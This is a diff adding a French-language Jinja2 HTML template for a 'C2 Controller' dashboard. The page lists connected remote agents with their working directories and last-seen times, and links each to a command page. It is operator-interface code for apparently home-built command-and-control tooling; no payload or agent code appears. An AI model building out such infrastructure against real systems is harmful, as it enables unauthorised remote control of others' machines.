@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Controller</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+        }
+        .info {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .agents {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        .agent-card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        .agent-card:hover {
+            transform: translateY(-5px);
+        }
+        .agent-id {
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .agent-info {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 0.95em;
+        }
+        .agent-info strong {
+            color: #333;
+        }
+        .control-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-decoration: none;
+            text-align: center;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .control-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+        .no-agents {
+            background: white;
+            padding: 60px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #4CAF50;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .refresh-btn {
+            background: white;
+            color: #667eea;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 C2 Controller</h1>
+        
+        <div style="text-align: center;">
+            <button class="refresh-btn" onclick="location.reload()">🔄 Rafraîchir</button>
+        </div>
+        
+        <div class="info">
+            <h2>📊 Agents connectés: {{ agents|length }}</h2>
+        </div>
+        
+        {% if agents %}
+        <div class="agents">
+            {% for agent in agents %}
+            <div class="agent-card">
+                <div class="agent-id">
+                    <span class="status-dot"></span>{{ agent.id }}
+                </div>
+                <div class="agent-info">
+                    <strong>📁 Répertoire:</strong> {{ agent.cwd }}<br>
+                    <strong>⏱️ Dernière activité:</strong> il y a {{ agent.last_seen }}s
+                </div>
+                <a href="/{{ agent.id }}/cmd" class="control-btn">
+                    ⚡ Contrôler cet agent
+                </a>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <div class="no-agents">
+            <h2>🔍 Aucun agent connecté</h2>
+            <p>En attente de connexions...</p>
+        </div>
+        {% endif %}
+    </div>
+    
+    <script>
+        // Auto-refresh toutes les 5 secondes
+        setTimeout(() => location.reload(), 5000);
+    </script>
+</body>
+</html>
